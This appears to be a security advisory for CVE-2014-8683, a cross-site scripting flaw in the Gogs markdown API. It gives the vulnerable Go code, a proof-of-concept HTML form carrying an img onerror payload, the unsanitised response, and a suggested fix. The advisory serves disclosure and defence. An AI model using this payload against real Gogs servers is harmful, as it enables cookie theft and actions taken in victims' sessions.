=============================
Researcher: Timo Schmid <tschmid@ernw.de>


Description
===========
Gogs(Go Git Service) is a painless self-hosted Git Service written in
Go. (taken
 from [1])

It is very similiar to the github hosting plattform. Multiple users can
create
multiple repositories and share code with others with the git version
control
access from
 unauthorized users.

Gogs provides two api views to transform markdown into HTML at the urls
/api/v1/markdown and /api/v1/markdown/raw

The transformation is vulnerable to XSS.


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


CVSS Base Score
===============
4.3 (AV:N / AC:M / Au:N / C:P / I:N / A:N)


CVE-ID
======
CVE-2014-8683


Impact
======
The vulnerability could be used together with social engineering attacks
to gain
access to restricted resources by extracting authentication tokens from
cookies
or by executing commands in the context of the logged in victim.


Status
======
Not fixed


Vulnerable Code Section
=======================
models/issue.go:
[...]
func RenderMarkdown(rawBytes []byte, urlPrefix string) []byte {
    body := RenderSpecialLink(rawBytes, urlPrefix)
    body = RenderRawMarkdown(body, urlPrefix)
    return body
}

func RenderMarkdownString(raw, urlPrefix string) string {
    return string(RenderMarkdown([]byte(raw), urlPrefix))
}
[...]


Proof of Concept
================
Form to trigger XSS:
<form action="http://example.com/api/v1/markdown" method="post">
<input name="text" value="<img
onerror="alert("XSS")
" src="x">">
<input type="submit">
</form>

Response:
<p><img onerror="alert("XSS")" src="x"></p>


Solution
========
The markdown processing should reject or filter any HTML input and
process only
markdown content.


Affected Versions
=================
>= v0.3.1-9-g49dc57e
